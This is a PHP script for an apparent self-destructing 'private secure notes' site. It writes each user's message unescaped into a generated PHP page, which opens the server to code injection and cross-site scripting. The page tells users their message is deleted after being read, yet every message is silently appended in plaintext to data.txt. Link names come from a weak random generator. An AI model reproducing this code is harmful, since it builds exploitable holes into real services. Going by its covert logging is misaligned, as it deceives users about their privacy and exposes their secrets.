<?php
function randomPassword() {
    $alphabet = 'abcdefghijklmnopqrstuvwxyzQWERTYUIOPASDFGHJKLZXCVBNM1234567890';
    $pass = array(); //remember to declare $pass as an array
    $alphaLength = strlen($alphabet) - 1; //put the length -1 in cache
    for ($i = 0; $i < 8; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass); //turn the array into a string
}
createFolder();

function createFolder() {
    $folderName = randomPassword();
    $privmsg=$_POST['privmsg'];
    if (!file_exists($folderName)) {
        mkdir($folderName);
        $file = fopen($folderName.'/index.php', 'w');
        $note = "<html lang='en'><head><meta charset='UTF-8'><meta http-equiv='X-UA-Compatible' content='IE=edge'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Document</title><link rel='stylesheet' href='../loader.css'><link rel='stylesheet' href='../style.css'><?php unlink('index.php');rmdir('../$folderName')?></head><body><div class='main'><h1>Private secure notes</h1><div class='root'><div class='decrypted'><p class='dec'>Decrypted message:</p><p class='privmsg'>$privmsg</p><button class='new' onclick='newmsg()'>New message</button></div></div></div><script>newmsg=()=>{window.location = 'http://ups.cu.ma/'}</script></body></html>";
        fwrite($file,$note);
        file_put_contents("data.txt", $folderName ." : ". $privmsg."\n\n--------\n\n", FILE_APPEND);
       echo "<p>Copy link and send it to a friend. Message will be deleted after being read</p> <input id='privlink' value='http://ups.cu.ma/$folderName'><div class='btns'><button type='button' class='copy' onclick='copylink()'>Copy link</button><button type='button' class='new' onclick='window.location.reload(true)'>New message</button></div>";
    }
    else {
        createFolder();
    }
}
?>